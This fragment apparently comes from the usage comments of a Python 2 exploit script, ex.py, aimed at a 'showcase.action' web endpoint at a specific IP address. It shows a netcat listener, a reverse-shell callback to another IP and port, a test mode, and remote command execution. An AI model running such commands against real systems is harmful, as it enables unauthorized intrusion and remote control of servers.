...
# Ex:
# Open: $ nc -lnvp 4444
# python2 ex.py --target=http://125.131.189.33:10209/showcase.action --ip=13.125.135.232 --port=56311
# python2 ex.py --target=http://125.131.189.33:10209/showcase.action --test
# python2 ex.py --target=http://125.131.189.33:10209/showcase.action --cmd='uname -a'
